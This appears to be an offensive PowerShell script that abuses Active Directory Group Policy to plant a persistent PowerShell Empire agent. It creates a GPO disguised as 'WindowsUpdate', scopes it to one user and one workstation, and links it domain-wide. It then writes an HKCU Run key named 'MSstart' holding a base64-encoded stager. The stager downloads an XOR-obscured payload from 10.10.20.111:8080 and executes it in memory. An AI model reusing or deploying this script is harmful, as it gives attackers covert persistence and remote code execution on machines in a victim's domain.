# Installs and imports Group Policy modules in Powershell
Add-WindowsFeature GPMC
import-module group-policy

# Creates GPO WindowsUpdate in domain SPH.CORP, server FRSV210.
New-GPo -name WindowsUpdate -domain SPH.corp -Server FRSV210.sph.corp

# The policy is only applied to user Juliette on workstation FRPC066
Set-GPPermissions -Name "WindowsUpdate" -Replace -PermissionLevel GpoApply -TargetName "juliette" -TargetType user
Set-GPPermissions -Name "WindowsUpdate" -Replace -PermissionLevel GpoApply -TargetName "FRPC066" -TargetType computer
Set-GPPermissions -Name "WindowsUpdate" -PermissionLevel None -TargetName "Authenticated Users" -TargetType Group

# The policy is activated
New-GPLink -Name WindowsUpdate -Domain sph.corp -Target "dc=sph,dc=corp" -order 1 -enforced yes

# Setup the RUN key with Empire agent 
Set-GPRegistryValue -Name "WindowsUpdate" -key "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName MSstart -Type String -value "powershell.exe -NoP -sta -NonI -Enc WwBTAHkAUwB0AGUAbQAuAE4ARQBUAC4AUwBlAFIAVgBpAGMARQBQAG8AaQBuAHQATQBhAG4AQQBHAGUAUgBdADoAOgBFAHgAcABlAGMAdAAxADAAMABDAE8AbgBUAEkATgBVAGUAIAA9ACAAMAA7ACQAVwBjAD0ATgBFAFcALQBPAEIASgBFAEMAVAAgAFMAWQBTAFQAZQBNAC4ATgBlAFQALgBXAGUAYgBDAGwASQBlAG4AdAA7ACQAdQA9ACcATQBvAHoAaQBsAGwAYQAvADUALgAwACAAKABXAGkAbgBkAG8AdwBzACAATgBUACAANgAuADEAOwAgAFcATwBXADYANAA7ACAAVAByAGkAZABlAG4AdAAvADcALgAwADsAIAByAHYAOgAxADEALgAwACkAIABsAGkAawBlACAARwBlAGMAawBvACcAOwAkAHcAYwAuAEgAZQBhAEQAZQBSAHMALgBBAGQAZAAoACcAVQBzAGUAcgAtAEEAZwBlAG4AdAAnACwAJAB1ACkAOwAkAFcAYwAuAFAAUgBvAHgAeQAgAD0AIABbAFMAWQBTAFQAZQBtAC4ATgBFAFQALgBXAEUAQgBSAGUAUQB1AGUAcwB0AF0AOgA6AEQARQBGAEEAVQBsAHQAVwBlAEIAUAByAE8AeAB5ADsAJAB3AEMALgBQAHIATwB4AFkALgBDAFIAZQBkAGUAbgB0AGkAYQBMAHMAIAA9ACAAWwBTAFkAUwB0AEUAbQAuAE4ARQBUAC4AQwByAGUAZABFAG4AdABpAGEATABDAGEAYwBIAGUAXQA6ADoARABFAGYAQQB1AGwAdABOAGUAVAB3AE8AUgBrAEMAcgBFAGQARQBOAFQASQBBAEwAcwA7ACQASwA9ACcANwBjADMANwBiAGUANwAyADYAMABmADgAYwBkADcAYwAxAGYANQBlADQAZABiAGQAZAA3AGIAYwA1AGIAMgAzACcAOwAkAEkAPQAwADsAWwBDAEgAQQByAFsAXQBdACQAYgA9ACgAWwBjAEgAYQByAFsAXQBdACgAJAB3AGMALgBEAE8AVwBuAEwAbwBhAGQAUwB0AHIASQBuAEcAKAAiAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMgAwAC4AMQAxADEAOgA4ADAAOAAwAC8AaQBuAGQAZQB4AC4AYQBzAHAAIgApACkAKQB8ACUAewAkAF8ALQBiAFgAbwBSACQAawBbACQASQArACsAJQAkAEsALgBMAGUAbgBnAFQASABdAH0AOwBJAEUAWAAgACgAJABCAC0AagBPAEkATgAnACcAKQA=" 
